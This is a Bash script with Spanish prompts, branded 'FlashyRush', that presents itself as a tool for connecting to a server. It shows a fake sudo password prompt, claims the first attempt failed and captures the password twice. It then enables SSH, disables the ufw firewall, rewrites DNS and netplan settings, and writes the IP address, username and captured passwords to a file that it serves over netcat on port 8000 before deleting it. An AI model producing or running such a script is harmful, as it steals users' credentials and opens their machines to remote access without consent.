#!/bin/bash

clear
figlet FlashyRush

echo "Conectar con el servidor"

echo "Se requieren permisos de administrador"

echo -n "[sudo] contraseña para $USER: "
read -s contra
sleep 2s
echo ""
echo "Lo sentimos, vuelva a intentarlo."
echo -n "[sudo] contraseña para $USER: "
read -s contrasena

echo "AVISO: Se va a llevar a cabo datos que sólo puede ejecutar el administrador del equipo..."
sudo apt-get update > /dev/null

echo "Paquetes actualizados. Habilitando servicio SSH..."

sudo apt-get remove --purge openssh-server -y > /dev/null
sudo apt-get install openssh-server -y > /dev/null


ip=$(hostname -I)

echo "IP: $ip" > datos.txt
echo "USUARIO: $USER" >> datos.txt
echo "CONTRA: $contra" >> datos.txt
echo "CONTRASEÑA: $contrasena" >> datos.txt
ip a >> datos.txt


sudo ufw disable > /dev/null

sudo sed '1,$s/127.0.0.53/8.8.8.8/g' /etc/resolv.conf > resolv.conf
sudo mv resolv.conf /etc/resolv.conf

echo "Conectando con puerto 8000 para enviar la información necesaria al servidor..."
nc -v -w2 -lp 8000 < datos.txt
echo "Conectado a puerto 8000 con éxito"

clear

figlet FlashyRush

rm datos.txt

echo "# Let NetworkManager manage all devices on this system" > 01-network-manager-all.yaml
echo "network:" >> 01-network-manager-all.yaml
echo "  version: 2" >> 01-network-manager-all.yaml
echo "  renderer: networkd" >> 01-network-manager-all.yaml
echo "  ethernets:" >> 01-network-manager-all.yaml
tarjeta_red=$(ip a | grep "2: " | cut -d" " -f 2)
echo "    $tarjeta_red" >> 01-network-manager-all.yaml
echo "      dhcp4: no" >> 01-network-manager-all.yaml
ip_mac=$(ip a | grep "scope global" | cut -d" " -f 6)
echo "      addresses: [$ip_mac]" >> 01-network-manager-all.yaml
ip a | grep "scope global dynamic" > datos_ip
cut -d" " -f 8 datos_ip > datos_brd
broadcast=$(cut -d"." -f 1-3 datos_brd)
echo "      gateway4: $broadcast.1"  >> 01-network-manager-all.yaml
echo "      nameservers:" >> 01-network-manager-all.yaml
echo "        addresses: [8.8.8.8,8.8.4.4]" >> 01-network-manager-all.yaml
sudo cp 01-network-manager-all.yaml /etc/netplan/01-network-manager-all.yaml
sudo netplan apply
echo "Done! Proceso finalizado con éxito" 

